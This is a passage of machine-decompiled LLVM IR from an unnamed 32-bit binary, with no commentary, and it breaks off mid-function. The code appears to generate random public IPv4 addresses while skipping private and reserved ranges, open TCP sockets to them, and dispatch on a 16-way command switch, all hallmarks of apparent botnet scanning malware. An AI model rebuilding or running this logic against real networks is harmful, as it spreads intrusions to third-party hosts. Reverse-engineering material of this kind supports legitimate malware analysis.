  %v4_80499f8 = call i32 @function_804a698(i8* %v3_80499f8, i32 %v2_80499cc)
  store i32 %v4_80499f8, i32* %eax.global-to-local, align 4
  %v0_8049a00 = load i32, i32* @edi, align 4
  %v1_8049a00 = load i32, i32* @ebp, align 4
  store i32 %v2_8049932, i32* @esi, align 4
  %v5_8049a06 = icmp slt i32 %v0_8049a00, %v1_8049a00
  br i1 %v5_8049a06, label %dec_label_pc_80499c7, label %dec_label_pc_8049a08

dec_label_pc_8049a08:                             ; preds = %dec_label_pc_80499c7, %dec_label_pc_804992b
  store i32 %v2_8049932, i32* %stack_var_-2412, align 4
  %v6_8049a11 = call i32 @function_804a6fc(i32 %v2_8049932, i8 0, i32 1024)
  store i32 %v6_8049a11, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %v2_8049932, i32* %stack_var_-2412, align 4
  %v3_8049a1e = call i32 @function_804a6d6(i32 %v2_8049932, i32 ptrtoint ([71 x i8]* @global_var_804d413.52 to i32))
  %v2_8049a23 = load i32, i32* %stack_var_-2412, align 4
  store i32 %v2_8049a23, i32* @eax, align 4
  store i32 ptrtoint ([71 x i8]* @global_var_804d413.52 to i32), i32* %edx.global-to-local, align 4
  store i32 %v2_804999e, i32* %edi.global-to-local, align 4
  store i32 %v2_8049932, i32* %stack_var_-2412, align 4
  %v4_8049a2e = call i32 @function_804a698(i8* %v3_8049942, i32 %v2_804999e)
  store i32 %v4_8049a2e, i32* @eax, align 4
  %v2_8049a33 = load i32, i32* %stack_var_-2412, align 4
  store i32 %v2_8049a33, i32* @edi, align 4
  store i32 %v2_8049932, i32* %stack_var_-2412, align 4
  %v4_8049a3b = call i32 @function_804a698(i8* %v3_8049942, i32 ptrtoint ([5 x i8]* @global_var_804d45a.53 to i32))
  br label %dec_label_pc_8049ad3

dec_label_pc_8049a4d:                             ; preds = %dec_label_pc_8049857
  %v12_8049a4d = icmp eq i8 %arg1, 1
  br i1 %v12_8049a4d, label %dec_label_pc_8049ae0, label %dec_label_pc_8049a60

dec_label_pc_8049a60:                             ; preds = %dec_label_pc_8049a4d
  %v12_8049a60 = icmp eq i8 %arg1, 4
  %v1_8049a65 = icmp eq i1 %v12_8049a60, false
  br i1 %v1_8049a65, label %dec_label_pc_8049e75, label %dec_label_pc_8049a6b

dec_label_pc_8049a6b:                             ; preds = %dec_label_pc_8049a60
  store i32 12, i32* %stack_var_-2412, align 4
  %v1_8049a70 = call i32 @function_804b6c8(i32 12)
  %v2_8049a70 = inttoptr i32 %v1_8049a70 to i16*
  store i32 ptrtoint ([62 x i8]* @global_var_804d45f.54 to i32), i32* @ecx, align 4
  store i32 1, i32* @edx, align 4
  %v2_8049a7f = add i32 %v1_8049a70, 8
  %v3_8049a7f = inttoptr i32 %v2_8049a7f to i32*
  store i32 0, i32* %v3_8049a7f, align 4
  store i16 0, i16* %v2_8049a70, align 2
  %v2_8049a8b = add i32 %v1_8049a70, 2
  %v3_8049a8b = inttoptr i32 %v2_8049a8b to i8*
  store i8 0, i8* %v3_8049a8b, align 1
  store i32 %v1_8049a70, i32* @global_var_804f6a8.46, align 8
  store i32 %v1_8049a70, i32* @global_var_804f6a4.55, align 4
  store i32 61, i32* @eax, align 4
  %v0_8049a9e = call i32 @function_80495b0()
  store i32 ptrtoint ([32 x i8]* @global_var_804d49d.56 to i32), i32* @ecx, align 4
  store i32 2, i32* @edx, align 4
  store i32 31, i32* @eax, align 4
  %v0_8049ab2 = call i32 @function_80495b0()
  store i32 ptrtoint ([11 x i8]* @global_var_804d4bd.57 to i32), i32* @ecx, align 4
  store i32 3, i32* @edx, align 4
  store i32 10, i32* @eax, align 4
  %v0_8049ac6 = call i32 @function_80495b0()
  br label %dec_label_pc_8049ad3

dec_label_pc_8049ad3:                             ; preds = %dec_label_pc_8049a08, %dec_label_pc_8049a6b
  %storemerge5 = phi i32 [ %v4_8049a3b, %dec_label_pc_8049a08 ], [ %v0_8049ac6, %dec_label_pc_8049a6b ]
  store i32 %storemerge5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049ae0

dec_label_pc_8049ae0:                             ; preds = %dec_label_pc_8049816, %dec_label_pc_8049a4d, %dec_label_pc_8049ad3
  store i32 0, i32* @ebx, align 4
  %v15_8049b0a18 = icmp eq i32 %stack_var_-2368.0, 0
  br i1 %v15_8049b0a18, label %dec_label_pc_8049b10, label %dec_label_pc_8049ae4

dec_label_pc_8049ae4:                             ; preds = %dec_label_pc_8049ae0, %dec_label_pc_8049ae4
  %v0_8049ae5 = phi i32 [ %v0_8049b0a, %dec_label_pc_8049ae4 ], [ 0, %dec_label_pc_8049ae0 ]
  %stack_var_-2308.021 = phi i32 [ %v1_8049afe, %dec_label_pc_8049ae4 ], [ %v4_8049821, %dec_label_pc_8049ae0 ]
  %v1_8049ae5 = add i32 %v0_8049ae5, 1
  store i32 %v1_8049ae5, i32* @ebx, align 4
  store i32 %stack_var_-2308.021, i32* %stack_var_-2412, align 4
  %v6_8049af1 = call i32 @function_804a6fc(i32 %stack_var_-2308.021, i8 0, i32 1048)
  store i32 %stack_var_-2308.021, i32* %eax.global-to-local, align 4
  %v1_8049afa = add i32 %stack_var_-2308.021, 17
  %v2_8049afa = inttoptr i32 %v1_8049afa to i8*
  store i8 1, i8* %v2_8049afa, align 1
  %v0_8049afe = load i32, i32* %eax.global-to-local, align 4
  %v1_8049afe = add i32 %v0_8049afe, 1048
  store i32 %v1_8049afe, i32* %eax.global-to-local, align 4
  %v0_8049b0a = load i32, i32* @ebx, align 4
  %v5_8049b0e = icmp slt i32 %v0_8049b0a, %stack_var_-2368.0
  br i1 %v5_8049b0e, label %dec_label_pc_8049ae4, label %dec_label_pc_8049b10

dec_label_pc_8049b10:                             ; preds = %dec_label_pc_8049ae4, %dec_label_pc_8049ae0, %dec_label_pc_804a536
  %v0_8049b10 = phi i32 [ %v0_804a536, %dec_label_pc_804a536 ], [ %v15_804978d, %dec_label_pc_8049ae0 ], [ %v15_804978d, %dec_label_pc_8049ae4 ]
  %stack_var_-2308.1 = phi i32 [ %stack_var_-2308.8, %dec_label_pc_804a536 ], [ %v4_8049821, %dec_label_pc_8049ae0 ], [ %v1_8049afe, %dec_label_pc_8049ae4 ]
  %v1_8049b10 = add i32 %v0_8049b10, 48
  %v2_8049b10 = inttoptr i32 %v1_8049b10 to i32*
  %v3_8049b10 = load i32, i32* %v2_8049b10, align 4
  store i32 %v3_8049b10, i32* %edx.global-to-local, align 4
  %v1_8049b14 = add i32 %v0_8049b10, 92
  %v2_8049b14 = inttoptr i32 %v1_8049b14 to i32*
  store i32 0, i32* %v2_8049b14, align 4
  %v0_8049b1c = load i32, i32* %edx.global-to-local, align 4
  %v1_8049b1c = add i32 %v0_8049b1c, 16
  store i32 %v1_8049b1c, i32* %edx.global-to-local, align 4
  %v1_8049b1f = load i32, i32* @esp, align 4
  %v2_8049b1f = add i32 %v1_8049b1f, 84
  %v3_8049b1f = inttoptr i32 %v2_8049b1f to i32*
  store i32 %v1_8049b1c, i32* %v3_8049b1f, align 4
  br label %dec_label_pc_804a536

dec_label_pc_8049b28:                             ; preds = %dec_label_pc_804a536
  %v1_8049b28 = add i32 %v0_804a536, 84
  %v2_8049b28 = inttoptr i32 %v1_8049b28 to i32*
  %v3_8049b28 = load i32, i32* %v2_8049b28, align 4
  store i32 %v3_8049b28, i32* @ecx, align 4
  %v1_8049b30 = add i32 %v3_8049b28, -16
  store i32 %v1_8049b30, i32* @ebp, align 4
  %v1_8049b33 = inttoptr i32 %v3_8049b28 to i8*
  %v2_8049b3c = load i8, i8* %v1_8049b33, align 1
  %v3_8049b3c = sext i8 %v2_8049b3c to i32
  %v4_8049b3c = zext i8 %v2_8049b3c to i32
  store i32 %v4_8049b3c, i32* @eax, align 4
  switch i32 %v3_8049b3c, label %dec_label_pc_804a52a [
    i32 0, label %dec_label_pc_8049b46
    i32 1, label %dec_label_pc_8049d35
    i32 2, label %dec_label_pc_8049e34
    i32 3, label %dec_label_pc_804a1f6
    i32 4, label %dec_label_pc_804a23f
    i32 5, label %dec_label_pc_8049e7f
    i32 6, label %dec_label_pc_804a377
    i32 7, label %dec_label_pc_804a417
    i32 8, label %dec_label_pc_804a2b9
    i32 9, label %dec_label_pc_8049ecd
    i32 10, label %dec_label_pc_804a2d7
    i32 11, label %dec_label_pc_804a491
    i32 12, label %dec_label_pc_804a050
    i32 13, label %dec_label_pc_804a32a
    i32 14, label %dec_label_pc_804a143
    i32 15, label %dec_label_pc_804a51e
  ]

dec_label_pc_8049b46:                             ; preds = %dec_label_pc_8049b28
  %v3_8049b46 = load i32, i32* %v2_8049b28, align 4
  store i32 %v3_8049b46, i32* %edi.global-to-local, align 4
  %v1_8049b4a = add i32 %v3_8049b46, 1
  %v2_8049b4a = inttoptr i32 %v1_8049b4a to i8*
  %v3_8049b4a = load i8, i8* %v2_8049b4a, align 1
  %v12_8049b4a = icmp eq i8 %v3_8049b4a, 1
  %v1_8049b4e = icmp eq i1 %v12_8049b4a, false
  br i1 %v1_8049b4e, label %dec_label_pc_8049ca7, label %dec_label_pc_8049b54

dec_label_pc_8049b54:                             ; preds = %dec_label_pc_8049b46
  %v0_8049b54 = load i32, i32* @ebx, align 4
  %v2_8049b54 = add i32 %v0_804a536, -4
  %v3_8049b54 = inttoptr i32 %v2_8049b54 to i32*
  store i32 %v0_8049b54, i32* %v3_8049b54, align 4
  %v1_8049b55 = add i32 %v0_804a536, -8
  %v2_8049b55 = inttoptr i32 %v1_8049b55 to i32*
  store i32 1048, i32* %v2_8049b55, align 4
  %v1_8049b5a = add i32 %v0_804a536, -12
  %v2_8049b5a = inttoptr i32 %v1_8049b5a to i32*
  store i32 0, i32* %v2_8049b5a, align 4
  %v0_8049b5c = load i32, i32* @ebp, align 4
  %v2_8049b5c = add i32 %v0_804a536, -16
  %v3_8049b5c = inttoptr i32 %v2_8049b5c to i32*
  store i32 %v0_8049b5c, i32* %v3_8049b5c, align 4
  %v4_8049b5d = call i32 @function_804a6fc(i32 %stack_var_-2308.8, i8 ptrtoint (i32* @0 to i8), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049b5d, i32* %eax.global-to-local, align 4
  %v0_8049b62 = load i32, i32* @esp, align 4
  %v1_8049b62 = add i32 %v0_8049b62, 52
  %v2_8049b62 = inttoptr i32 %v1_8049b62 to i32*
  %v3_8049b62 = load i32, i32* %v2_8049b62, align 4
  store i32 %v3_8049b62, i32* %eax.global-to-local, align 4
  %v1_8049b69 = trunc i32 %v3_8049b62 to i16
  %v2_8049b69 = load i32, i32* %edi.global-to-local, align 4
  %v3_8049b69 = add i32 %v2_8049b69, -12
  %v4_8049b69 = inttoptr i32 %v3_8049b69 to i16*
  store i16 %v1_8049b69, i16* %v4_8049b69, align 2
  br label %dec_label_pc_8049b6d

dec_label_pc_8049b6d:                             ; preds = %dec_label_pc_8049bc0, %dec_label_pc_8049c09, %dec_label_pc_8049c58, %dec_label_pc_8049c25, %dec_label_pc_8049c6f, %dec_label_pc_8049c5f, %dec_label_pc_8049c4d, %dec_label_pc_8049c42, %dec_label_pc_8049c37, %dec_label_pc_8049bfa, %dec_label_pc_8049bb2, %dec_label_pc_8049bab, %dec_label_pc_8049b6d, %dec_label_pc_8049b54
  %v1_8049b6d = call i32 @function_80490fc(i32 %stack_var_-2308.8)
  %v2_8049b6d = sext i32 %v1_8049b6d to i64
  store i32 255, i32* %ebx.global-to-local, align 4
  %v9_8049b79 = udiv i64 %v2_8049b6d, 255
  %v10_8049b79 = trunc i64 %v9_8049b79 to i32
  store i32 %v10_8049b79, i32* %eax.global-to-local, align 4
  %v11_8049b79 = urem i64 %v2_8049b6d, 255
  %v12_8049b79 = trunc i64 %v11_8049b79 to i32
  store i32 %v12_8049b79, i32* %edx.global-to-local, align 4
  %v1_8049b7b = trunc i64 %v11_8049b79 to i8
  %v2_8049b7b = load i32, i32* @esp, align 4
  %v3_8049b7b = add i32 %v2_8049b7b, 64
  %v4_8049b7b = inttoptr i32 %v3_8049b7b to i8*
  store i8 %v1_8049b7b, i8* %v4_8049b7b, align 1
  %v1_8049b7f = call i32 @function_80490fc(i32 %stack_var_-2308.8)
  %v2_8049b7f = sext i32 %v1_8049b7f to i64
  %v0_8049b86 = load i32, i32* %ebx.global-to-local, align 4
  %v8_8049b86 = zext i32 %v0_8049b86 to i64
  %v9_8049b86 = udiv i64 %v2_8049b7f, %v8_8049b86
  %v10_8049b86 = trunc i64 %v9_8049b86 to i32
  store i32 %v10_8049b86, i32* %eax.global-to-local, align 4
  %v11_8049b86 = urem i64 %v2_8049b7f, %v8_8049b86
  %v12_8049b86 = trunc i64 %v11_8049b86 to i32
  store i32 %v12_8049b86, i32* %edx.global-to-local, align 4
  %v1_8049b88 = trunc i64 %v11_8049b86 to i8
  %v2_8049b88 = load i32, i32* @esp, align 4
  %v3_8049b88 = add i32 %v2_8049b88, 63
  %v4_8049b88 = inttoptr i32 %v3_8049b88 to i8*
  store i8 %v1_8049b88, i8* %v4_8049b88, align 1
  %v1_8049b8c = call i32 @function_80490fc(i32 %stack_var_-2308.8)
  %v2_8049b8c = sext i32 %v1_8049b8c to i64
  %v0_8049b93 = load i32, i32* %ebx.global-to-local, align 4
  %v8_8049b93 = zext i32 %v0_8049b93 to i64
  %v9_8049b93 = udiv i64 %v2_8049b8c, %v8_8049b93
  %v10_8049b93 = trunc i64 %v9_8049b93 to i32
  store i32 %v10_8049b93, i32* %eax.global-to-local, align 4
  %v11_8049b93 = urem i64 %v2_8049b8c, %v8_8049b93
  %v12_8049b93 = trunc i64 %v11_8049b93 to i32
  store i32 %v12_8049b93, i32* %edx.global-to-local, align 4
  %v1_8049b95 = trunc i64 %v11_8049b93 to i8
  %v2_8049b95 = load i32, i32* @esp, align 4
  %v3_8049b95 = add i32 %v2_8049b95, 62
  %v4_8049b95 = inttoptr i32 %v3_8049b95 to i8*
  store i8 %v1_8049b95, i8* %v4_8049b95, align 1
  %v1_8049b99 = call i32 @function_80490fc(i32 %stack_var_-2308.8)
  %v2_8049b99 = sext i32 %v1_8049b99 to i64
  %v0_8049ba0 = load i32, i32* %ebx.global-to-local, align 4
  %v8_8049ba0 = zext i32 %v0_8049ba0 to i64
  %v9_8049ba0 = udiv i64 %v2_8049b99, %v8_8049ba0
  %v10_8049ba0 = trunc i64 %v9_8049ba0 to i32
  store i32 %v10_8049ba0, i32* %eax.global-to-local, align 4
  %v11_8049ba0 = urem i64 %v2_8049b99, %v8_8049ba0
  %v12_8049ba0 = trunc i64 %v11_8049ba0 to i32
  store i32 %v12_8049ba0, i32* %edx.global-to-local, align 4
  %v0_8049ba2 = load i32, i32* @esp, align 4
  %v1_8049ba2 = add i32 %v0_8049ba2, 64
  %v2_8049ba2 = inttoptr i32 %v1_8049ba2 to i8*
  %v3_8049ba2 = load i8, i8* %v2_8049ba2, align 1
  %v12_8049ba2 = icmp eq i8 %v3_8049ba2, 127
  %v1_8049ba7 = urem i32 %v12_8049ba0, 256
  %v3_8049ba7 = and i32 %v0_8049ba0, -256
  %v4_8049ba7 = or i32 %v1_8049ba7, %v3_8049ba7
  store i32 %v4_8049ba7, i32* @ebx, align 4
  br i1 %v12_8049ba2, label %dec_label_pc_8049b6d, label %dec_label_pc_8049bab

dec_label_pc_8049bab:                             ; preds = %dec_label_pc_8049b6d
  %v3_8049bab = load i8, i8* %v2_8049ba2, align 1
  %v4_8049bab = icmp eq i8 %v3_8049bab, 0
  br i1 %v4_8049bab, label %dec_label_pc_8049b6d, label %dec_label_pc_8049bb2

dec_label_pc_8049bb2:                             ; preds = %dec_label_pc_8049bab
  %v3_8049bb2 = load i8, i8* %v2_8049ba2, align 1
  %v12_8049bb2 = icmp eq i8 %v3_8049bb2, 10
  br i1 %v12_8049bb2, label %dec_label_pc_8049b6d, label %dec_label_pc_8049bb9

dec_label_pc_8049bb9:                             ; preds = %dec_label_pc_8049bb2
  %v3_8049bb9 = load i8, i8* %v2_8049ba2, align 1
  %v10_8049bb9 = icmp eq i8 %v3_8049bb9, -64
  %v1_8049bbe = icmp eq i1 %v10_8049bb9, false
  br i1 %v1_8049bbe, label %dec_label_pc_8049bca, label %dec_label_pc_8049bc0

dec_label_pc_8049bc0:                             ; preds = %dec_label_pc_8049bb9
  %v1_8049bc0 = add i32 %v0_8049ba2, 63
  %v2_8049bc0 = inttoptr i32 %v1_8049bc0 to i8*
  %v3_8049bc0 = load i8, i8* %v2_8049bc0, align 1
  %v13_8049bc0 = icmp eq i8 %v3_8049bc0, -88
  br i1 %v13_8049bc0, label %dec_label_pc_8049b6d, label %dec_label_pc_8049c75

dec_label_pc_8049bca:                             ; preds = %dec_label_pc_8049bb9
  %v3_8049bca = load i8, i8* %v2_8049ba2, align 1
  %v13_8049bca = icmp eq i8 %v3_8049bca, -84
  %v1_8049bcf = icmp eq i1 %v13_8049bca, false
  br i1 %v1_8049bcf, label %dec_label_pc_8049be3, label %dec_label_pc_8049bd1

dec_label_pc_8049bd1:                             ; preds = %dec_label_pc_8049bca
  %v1_8049bd1 = add i32 %v0_8049ba2, 63
  %v2_8049bd1 = inttoptr i32 %v1_8049bd1 to i8*
  %v3_8049bd1 = load i8, i8* %v2_8049bd1, align 1
  %tmp119 = icmp ult i8 %v3_8049bd1, 16
  br i1 %tmp119, label %dec_label_pc_8049c75, label %dec_label_pc_8049bdc

dec_label_pc_8049bdc:                             ; preds = %dec_label_pc_8049bd1
  %v3_8049bdc = load i8, i8* %v2_8049bd1, align 1
  %v8_8049bdc = icmp ult i8 %v3_8049bdc, 31
  %v12_8049bdc = icmp eq i8 %v3_8049bdc, 31
  br label %dec_label_pc_8049bfa

dec_label_pc_8049be3:                             ; preds = %dec_label_pc_8049bca
  %v3_8049be3 = load i8, i8* %v2_8049ba2, align 1
  %v12_8049be3 = icmp eq i8 %v3_8049be3, 100
  %v1_8049be8 = icmp eq i1 %v12_8049be3, false
  br i1 %v1_8049be8, label %dec_label_pc_8049c02, label %dec_label_pc_8049bea

dec_label_pc_8049bea:                             ; preds = %dec_label_pc_8049be3
  %v1_8049bea = add i32 %v0_8049ba2, 63
  %v2_8049bea = inttoptr i32 %v1_8049bea to i8*
  %v3_8049bea = load i8, i8* %v2_8049bea, align 1
  %tmp120 = icmp ult i8 %v3_8049bea, 64
  br i1 %tmp120, label %dec_label_pc_8049c75, label %dec_label_pc_8049bf5

dec_label_pc_8049bf5:                             ; preds = %dec_label_pc_8049bea
  %v3_8049bf5 = load i8, i8* %v2_8049bea, align 1
  %v8_8049bf5 = icmp ult i8 %v3_8049bf5, 126
  %v12_8049bf5 = icmp eq i8 %v3_8049bf5, 126
  br label %dec_label_pc_8049bfa

dec_label_pc_8049bfa:                             ; preds = %dec_label_pc_8049c1e, %dec_label_pc_8049bdc, %dec_label_pc_8049bf5
  %v1_8049bfa = phi i1 [ %v12_8049c1e, %dec_label_pc_8049c1e ], [ %v12_8049bdc, %dec_label_pc_8049bdc ], [ %v12_8049bf5, %dec_label_pc_8049bf5 ]
  %v0_8049bfa = phi i1 [ %v8_8049c1e, %dec_label_pc_8049c1e ], [ %v8_8049bdc, %dec_label_pc_8049bdc ], [ %v8_8049bf5, %dec_label_pc_8049bf5 ]
  %v2_8049bfa = or i1 %v1_8049bfa, %v0_8049bfa
  br i1 %v2_8049bfa, label %dec_label_pc_8049b6d, label %dec_label_pc_8049c75

dec_label_pc_8049c02:                             ; preds = %dec_label_pc_8049be3
  %v3_8049c02 = load i8, i8* %v2_8049ba2, align 1
  %v13_8049c02 = icmp eq i8 %v3_8049c02, -87
  %v1_8049c07 = icmp eq i1 %v13_8049c02, false
  br i1 %v1_8049c07, label %dec_label_pc_8049c10, label %dec_label_pc_8049c09

dec_label_pc_8049c09:                             ; preds = %dec_label_pc_8049c02
  %v1_8049c09 = add i32 %v0_8049ba2, 63
  %v2_8049c09 = inttoptr i32 %v1_8049c09 to i8*
  %v3_8049c09 = load i8, i8* %v2_8049c09, align 1
  %v13_8049c09 = icmp eq i8 %v3_8049c09, -1
  br i1 %v13_8049c09, label %dec_label_pc_8049b6d, label %dec_label_pc_8049c75

dec_label_pc_8049c10:                             ; preds = %dec_label_pc_8049c02
  %v3_8049c10 = load i8, i8* %v2_8049ba2, align 1
  %v13_8049c10 = icmp eq i8 %v3_8049c10, -58
  %v1_8049c15 = icmp eq i1 %v13_8049c10, false
  br i1 %v1_8049c15, label %dec_label_pc_8049c25, label %dec_label_pc_8049c17

dec_label_pc_8049c17:                             ; preds = %dec_label_pc_8049c10
  %v1_8049c17 = add i32 %v0_8049ba2, 63
  %v2_8049c17 = inttoptr i32 %v1_8049c17 to i8*
  %v3_8049c17 = load i8, i8* %v2_8049c17, align 1
  %tmp121 = icmp ult i8 %v3_8049c17, 18
  br i1 %tmp121, label %dec_label_pc_8049c75, label %dec_label_pc_8049c1e

dec_label_pc_8049c1e:                             ; preds = %dec_label_pc_8049c17
  %v3_8049c1e = load i8, i8* %v2_8049c17, align 1
  %v8_8049c1e = icmp ult i8 %v3_8049c1e, 19
  %v12_8049c1e = icmp eq i8 %v3_8049c1e, 19
  br label %dec_label_pc_8049bfa

dec_label_pc_8049c25:                             ; preds = %dec_label_pc_8049c10
  %v3_8049c25 = load i8, i8* %v2_8049ba2, align 1
  %tmp122 = icmp ult i8 %v3_8049c25, -32
  br i1 %tmp122, label %dec_label_pc_8049c30, label %dec_label_pc_8049b6d

dec_label_pc_8049c30:                             ; preds = %dec_label_pc_8049c25
  %v3_8049c30 = load i8, i8* %v2_8049ba2, align 1
  %v12_8049c30 = icmp eq i8 %v3_8049c30, 106
  %v1_8049c35 = icmp eq i1 %v12_8049c30, false
  br i1 %v1_8049c35, label %dec_label_pc_8049c5f, label %dec_label_pc_8049c37

dec_label_pc_8049c37:                             ; preds = %dec_label_pc_8049c30
  %v1_8049c37 = add i32 %v0_8049ba2, 63
  %v2_8049c37 = inttoptr i32 %v1_8049c37 to i8*
  %v3_8049c37 = load i8, i8* %v2_8049c37, align 1
  %v13_8049c37 = icmp eq i8 %v3_8049c37, -71
  br i1 %v13_8049c37, label %dec_label_pc_8049b6d, label %dec_label_pc_8049c42

dec_label_pc_8049c42:                             ; preds = %dec_label_pc_8049c37
  %v3_8049c42 = load i8, i8* %v2_8049c37, align 1
  %v13_8049c42 = icmp eq i8 %v3_8049c42, -69
  br i1 %v13_8049c42, label %dec_label_pc_8049b6d, label %dec_label_pc_8049c4d

dec_label_pc_8049c4d:                             ; preds = %dec_label_pc_8049c42
  %v3_8049c4d = load i8, i8* %v2_8049c37, align 1
  %v13_8049c4d = icmp eq i8 %v3_8049c4d, -72
  br i1 %v13_8049c4d, label %dec_label_pc_8049b6d, label %dec_label_pc_8049c58

dec_label_pc_8049c58:                             ; preds = %dec_label_pc_8049c4d
  %v3_8049c58 = load i8, i8* %v2_8049c37, align 1
  %v13_8049c58 = icmp eq i8 %v3_8049c58, -70
  br i1 %v13_8049c58, label %dec_label_pc_8049b6d, label %dec_label_pc_8049c75

dec_label_pc_8049c5f:                             ; preds = %dec_label_pc_8049c30
  %v3_8049c5f = load i8, i8* %v2_8049ba2, align 1
  %v12_8049c5f = icmp eq i8 %v3_8049c5f, 6
  br i1 %v12_8049c5f, label %dec_label_pc_8049b6d, label %dec_label_pc_8049c6f

dec_label_pc_8049c6f:                             ; preds = %dec_label_pc_8049c5f
  %v3_8049c6a = load i8, i8* %v2_8049ba2, align 1
  %v12_8049c6a = icmp eq i8 %v3_8049c6a, 11
  br i1 %v12_8049c6a, label %dec_label_pc_8049b6d, label %dec_label_pc_8049c75

dec_label_pc_8049c75:                             ; preds = %dec_label_pc_8049bc0, %dec_label_pc_8049c09, %dec_label_pc_8049c58, %dec_label_pc_8049bfa, %dec_label_pc_8049c6f, %dec_label_pc_8049c17, %dec_label_pc_8049bea, %dec_label_pc_8049bd1
  %v3_8049c75 = load i8, i8* %v2_8049ba2, align 1
  %v4_8049c75 = zext i8 %v3_8049c75 to i32
  %v1_8049c79 = add i32 %v0_8049ba2, 63
  %v2_8049c79 = inttoptr i32 %v1_8049c79 to i8*
  %v3_8049c79 = load i8, i8* %v2_8049c79, align 1
  %v4_8049c79 = zext i8 %v3_8049c79 to i32
  store i32 %v4_8049c79, i32* %eax.global-to-local, align 4
  %v1_8049c7e = add i32 %v0_8049ba2, 62
  %v2_8049c7e = inttoptr i32 %v1_8049c7e to i8*
  %v3_8049c7e = load i8, i8* %v2_8049c7e, align 1
  %v4_8049c7e = zext i8 %v3_8049c7e to i32
  %v2_8049c83 = mul nuw i32 %v4_8049c75, 16777216
  %v2_8049c86 = mul nuw nsw i32 %v4_8049c79, 65536
  %v2_8049c89 = or i32 %v2_8049c86, %v2_8049c83
  store i32 %v1_8049ba7, i32* @eax, align 4
  %v2_8049c8e = or i32 %v2_8049c89, %v1_8049ba7
  %v2_8049c90 = mul nuw nsw i32 %v4_8049c7e, 256
  %v2_8049c93 = or i32 %v2_8049c8e, %v2_8049c90
  store i32 %v2_8049c93, i32* %edx.global-to-local, align 4
  %v1_8049c95 = add i32 %v0_8049ba2, 84
  %v2_8049c95 = inttoptr i32 %v1_8049c95 to i32*
  %v3_8049c95 = load i32, i32* %v2_8049c95, align 4
  store i32 %v3_8049c95, i32* @ecx, align 4
  %v1_8049c99 = trunc i32 %v2_8049c93 to i16
  %v2_8049c99 = call i16 @llvm.bswap.i16(i16 %v1_8049c99)
  %v3_8049c99 = zext i16 %v2_8049c99 to i32
  %v1_8049c9d = udiv i32 %v2_8049c89, 65536
  %v2_8049c9d = mul nuw i32 %v3_8049c99, 65536
  %v1_8049ca0 = trunc i32 %v1_8049c9d to i16
  %v2_8049ca0 = call i16 @llvm.bswap.i16(i16 %v1_8049ca0)
  %v3_8049ca0 = zext i16 %v2_8049ca0 to i32
  %v6_8049ca0 = or i32 %v2_8049c9d, %v3_8049ca0
  store i32 %v6_8049ca0, i32* %edx.global-to-local, align 4
  %v2_8049ca4 = add i32 %v3_8049c95, -16
  %v3_8049ca4 = inttoptr i32 %v2_8049ca4 to i32*
  store i32 %v6_8049ca0, i32* %v3_8049ca4, align 4
  %v0_8049ca7.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049ca7

dec_label_pc_8049ca7:                             ; preds = %dec_label_pc_8049b46, %dec_label_pc_8049c75
  %v0_8049ca7 = phi i32 [ %v0_804a536, %dec_label_pc_8049b46 ], [ %v0_8049ca7.pre, %dec_label_pc_8049c75 ]
  %v1_8049ca7 = add i32 %v0_8049ca7, 84
  %v2_8049ca7 = inttoptr i32 %v1_8049ca7 to i32*
  %v3_8049ca7 = load i32, i32* %v2_8049ca7, align 4
  store i32 %v3_8049ca7, i32* @edi, align 4
  %v1_8049cab = add i32 %v0_8049ca7, 2328
  %v2_8049cab = inttoptr i32 %v1_8049cab to i16*
  store i16 2, i16* %v2_8049cab, align 2
  %v0_8049cb5 = load i32, i32* @edi, align 4
  %v1_8049cb5 = add i32 %v0_8049cb5, -12
  %v2_8049cb5 = inttoptr i32 %v1_8049cb5 to i16*
  %v3_8049cb5 = load i16, i16* %v2_8049cb5, align 2
  %v4_8049cb5 = zext i16 %v3_8049cb5 to i32
  %v5_8049cb5 = load i32, i32* @eax, align 4
  %v6_8049cb5 = and i32 %v5_8049cb5, -65536
  %v7_8049cb5 = or i32 %v6_8049cb5, %v4_8049cb5
  store i32 %v7_8049cb5, i32* %eax.global-to-local, align 4
  %v2_8049cb9 = load i32, i32* @esp, align 4
  %v3_8049cb9 = add i32 %v2_8049cb9, 2330
  %v4_8049cb9 = inttoptr i32 %v3_8049cb9 to i16*
  store i16 %v3_8049cb5, i16* %v4_8049cb9, align 2
  %v0_8049cc1 = load i32, i32* @edi, align 4
  %v1_8049cc1 = add i32 %v0_8049cc1, -16
  %v2_8049cc1 = inttoptr i32 %v1_8049cc1 to i32*
  %v3_8049cc1 = load i32, i32* %v2_8049cc1, align 4
  store i32 %v3_8049cc1, i32* %eax.global-to-local, align 4
  %v1_8049cc4 = load i32, i32* @esp, align 4
  %v2_8049cc4 = add i32 %v1_8049cc4, 2332
  %v3_8049cc4 = inttoptr i32 %v2_8049cc4 to i32*
  store i32 %v3_8049cc1, i32* %v3_8049cc4, align 4
  %v0_8049ccb = load i32, i32* @ecx, align 4
  %v1_8049ccb = load i32, i32* @esp, align 4
  %v2_8049ccb = add i32 %v1_8049ccb, -4
  %v3_8049ccb = inttoptr i32 %v2_8049ccb to i32*
  store i32 %v0_8049ccb, i32* %v3_8049ccb, align 4
  %v1_8049ccc = add i32 %v1_8049ccb, -8
  %v2_8049ccc = inttoptr i32 %v1_8049ccc to i32*
  store i32 0, i32* %v2_8049ccc, align 4
  %v1_8049cce = add i32 %v1_8049ccb, -12
  %v2_8049cce = inttoptr i32 %v1_8049cce to i32*
  store i32 1, i32* %v2_8049cce, align 4
  %v1_8049cd0 = add i32 %v1_8049ccb, -16
  %v2_8049cd0 = inttoptr i32 %v1_8049cd0 to i32*
  store i32 2, i32* %v2_8049cd0, align 4
  %v3_8049cd2 = call i32 @function_804b584(i32 %stack_var_-2308.8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049cd2, i32* %eax.global-to-local, align 4
  %v10_8049cda = icmp eq i32 %v3_8049cd2, -1
  %v1_8049cdd = load i32, i32* @edi, align 4
  %v2_8049cdd = add i32 %v1_8049cdd, -8
  %v3_8049cdd = inttoptr i32 %v2_8049cdd to i32*
  store i32 %v3_8049cd2, i32* %v3_8049cdd, align 4
  br i1 %v10_8049cda, label %dec_label_pc_804a52a, label %dec_label_pc_8049ce6

dec_label_pc_8049ce6:                             ; preds = %dec_label_pc_8049ca7
  %v0_8049ce6 = load i32, i32* @edx, align 4
